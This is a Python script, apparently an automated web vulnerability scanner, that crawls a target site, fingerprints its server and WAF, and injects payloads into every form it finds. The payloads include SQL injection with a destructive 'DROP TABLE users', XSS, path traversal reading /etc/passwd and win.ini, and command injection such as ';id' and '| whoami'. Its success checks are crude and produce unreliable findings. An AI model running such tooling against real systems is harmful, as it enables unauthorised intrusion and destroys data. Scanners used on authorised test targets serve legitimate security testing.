#!/usr/bin/env python3

import requests, threading, re
from bs4 import BeautifulSoup
from urllib.parse import urljoin
from datetime import datetime
from queue import Queue

# === Config ===
TIMEOUT = 7
TARGET = input("[?] Enter target URL (default: http://testphp.vulnweb.com): ").strip() or "http://testphp.vulnweb.com"
HEADERS = {"User-Agent": "KaliGPT-CleanScanner/2.0"}
LOG_FILE = f"exploit_log_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
SCAN_THREADS = []

# === Payloads ===
SQLI_PAYLOADS = ["' OR '1'='1", "'; DROP TABLE users; --"]
XSS_PAYLOADS = ['<script>alert("XSS")</script>', '"><img src=x onerror=alert(1)>']
LFI_PAYLOADS = ["../../../../etc/passwd", "..\\..\\..\\windows\\win.ini"]
RCE_PAYLOADS = [";id", "| whoami", "&& uname -a"]

# === Logger ===
def log(msg, level="INFO"):
    tags = {"INFO": "[*]", "WARN": "[!]", "ALERT": "[!!]", "GOOD": "[+]"}.get(level, "[~]")
    print(f"{tags} Step: {msg}")
    with open(LOG_FILE, "a") as f:
        f.write(f"{level}: {msg}\n")

# === Header Fingerprinting ===
def fingerprint_headers(url):
    try:
        r = requests.get(url, headers=HEADERS)
        log(f"Server header: {r.headers.get('Server')}")
        log(f"X-Powered-By: {r.headers.get('X-Powered-By')}")
    except: pass

# === WAF Check ===
def detect_waf(url):
    try:
        r = requests.get(url, headers=HEADERS)
        waf = r.headers.get("Server", "")
        if re.search(r"cloudflare|sucuri|imperva|akamai", waf, re.I):
            log(f"Possible WAF Detected: {waf}", "WARN")
        else:
            log("No known WAF detected")
    except: pass

# === Form Scanner & Tester ===
def test_form_vulns(base_url, form):
    action = form.get("action") or ""
    method = form.get("method", "get").lower()
    inputs = {i.get("name", f"input_{i}"): "test" for i in form.find_all("input") if i.get("name")}
    full_url = urljoin(base_url, action)

    for payload in SQLI_PAYLOADS + XSS_PAYLOADS + LFI_PAYLOADS + RCE_PAYLOADS:
        test_data = {k: payload for k in inputs}
        try:
            if method == "post":
                res = requests.post(full_url, data=test_data, headers=HEADERS, timeout=TIMEOUT)
            else:
                res = requests.get(full_url, params=test_data, headers=HEADERS, timeout=TIMEOUT)

            if payload in res.text:
                log(f"Reflected payload detected at {full_url} using {payload}", "ALERT")
            if "root:x:0:0" in res.text or "boot.ini" in res.text:
                log(f"LFI Possibly Successful at {full_url}", "ALERT")
            if re.search(r"uid=\d+|root|Linux|Windows", res.text):
                log(f"RCE Possibly Successful at {full_url}", "ALERT")
        except Exception as e:
            log(f"Error testing {full_url}: {e}", "WARN")

def scan_forms(url):
    try:
        r = requests.get(url, headers=HEADERS)
        soup = BeautifulSoup(r.text, "html.parser")
        forms = soup.find_all("form")
        for form in forms:
            test_form_vulns(url, form)
    except: pass

# === JavaScript Endpoint Analysis ===
def find_js_links(url):
    try:
        res = requests.get(url, headers=HEADERS)
        scripts = re.findall(r'src=["\'](.*?\.js)["\']', res.text)
        for link in scripts:
            abs_link = urljoin(url, link)
            extract_js_endpoints(abs_link)
    except: pass

def extract_js_endpoints(js_url):
    try:
        r = requests.get(js_url, headers=HEADERS)
        endpoints = re.findall(r'["\'](\/api\/[a-zA-Z0-9\/\-_]+)["\']', r.text)
        for ep in set(endpoints):
            log(f"JS Endpoint: {ep}", "GOOD")
    except: pass

# === Dynamic Crawler ===
def crawl_site(start_url):
    visited = set()
    queue = Queue()
    queue.put(start_url)

    while not queue.empty():
        url = queue.get()
        if url in visited: continue
        visited.add(url)

        try:
            res = requests.get(url, headers=HEADERS, timeout=TIMEOUT)
            if res.status_code in [200, 302]:
                log(f"Active Path Found: {url}", "GOOD")
                t1 = threading.Thread(target=scan_forms, args=(url,))
                t2 = threading.Thread(target=find_js_links, args=(url,))
                SCAN_THREADS.extend([t1, t2])

                soup = BeautifulSoup(res.text, "html.parser")
                for link in soup.find_all("a", href=True):
                    next_url = urljoin(url, link["href"])
                    if start_url in next_url and next_url not in visited:
                        queue.put(next_url)
        except Exception as e:
            log(f"Error crawling {url}: {e}", "WARN")

# === Run Scanner ===
def run():
    log(f"Starting Web Exploit Scanner on {TARGET}")
    fingerprint_headers(TARGET)
    detect_waf(TARGET)
    crawl_site(TARGET)

    for t in SCAN_THREADS:
        t.start()
    for t in SCAN_THREADS:
        t.join()

    log("Scan finished successfully", "INFO")
    exit(0)

# === Entry Point ===
if __name__ == "__main__":
    run()

